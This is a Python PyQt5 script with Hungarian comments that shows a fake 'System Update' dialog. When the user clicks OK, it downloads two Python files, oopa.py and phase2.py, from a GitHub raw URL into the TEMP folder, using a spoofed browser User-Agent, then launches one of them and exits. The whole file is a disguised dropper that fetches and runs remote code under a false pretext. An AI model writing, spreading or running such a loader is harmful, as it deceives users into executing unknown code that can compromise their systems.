import sys
import os
import urllib.request
import subprocess
from PyQt5 import QtCore, QtGui, QtWidgets

class Ui_Dialog(object):
    def setupUi(self, Dialog):
        Dialog.setObjectName("Dialog")
        Dialog.resize(400, 150)
        Dialog.setWindowFlags(QtCore.Qt.Window | QtCore.Qt.WindowTitleHint | QtCore.Qt.CustomizeWindowHint)

        self.buttonBox = QtWidgets.QDialogButtonBox(Dialog)
        self.buttonBox.setGeometry(QtCore.QRect(30, 100, 341, 32))
        self.buttonBox.setOrientation(QtCore.Qt.Horizontal)
        self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Ok)

        self.textBrowser = QtWidgets.QTextBrowser(Dialog)
        self.textBrowser.setGeometry(QtCore.QRect(20, 20, 361, 71))
        
        self.retranslateUi(Dialog)
        self.buttonBox.accepted.connect(self.start_install)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "System Update"))
        self.textBrowser.setHtml(_translate("Dialog", "<html><body><p align='center'>Frissítés telepítése... Kattints az <b>OK</b> gombra.</p></body></html>"))

    def start_install(self):
        try:
            # TEMP mappa kinyerése biztos módszerrel
            temp_path = os.environ.get('TEMP', os.environ.get('TMP', os.path.expanduser('~')))
            oopa_temp = os.path.join(temp_path, "oopa.py")
            phase2_temp = os.path.join(temp_path, "phase2.py")
            
            # URL-ek - ELLENŐRIZD, HOGY A LINK JÓ-E A BÖNGÉSZŐBEN!
            urls = {
                "https://raw.githubusercontent.com/plen-maker/Vers1/main/oopa.py": oopa_temp,
                "https://raw.githubusercontent.com/plen-maker/Vers1/main/phase2.py": phase2_temp
            }

            # Letöltés kényszerítése
            for url, path in urls.items():
                try:
                    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req) as response, open(path, 'wb') as out_file:
                        out_file.write(response.read())
                except Exception as e:
                    # Ha nem sikerül, próbáljuk meg simán is
                    urllib.request.urlretrieve(url, path)

            # INDÍTÁS - ha létezik a fájl
            if os.path.exists(oopa_temp):
                # Megpróbáljuk elindítani a háttérben
                subprocess.Popen([sys.executable, oopa_temp], 
                                 creationflags=subprocess.CREATE_NEW_CONSOLE,
                                 shell=False)
            
            sys.exit()

        except Exception as e:
            # Ez segít neked látni, ha hiba van (csak tesztelés alatt hagyd benne!)
            QtWidgets.QMessageBox.critical(None, "Hiba", str(e))
            sys.exit()

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    Dialog = QtWidgets.QDialog()
    ui = Ui_Dialog()
    ui.setupUi(Dialog)
    Dialog.show()
    sys.exit(app.exec_())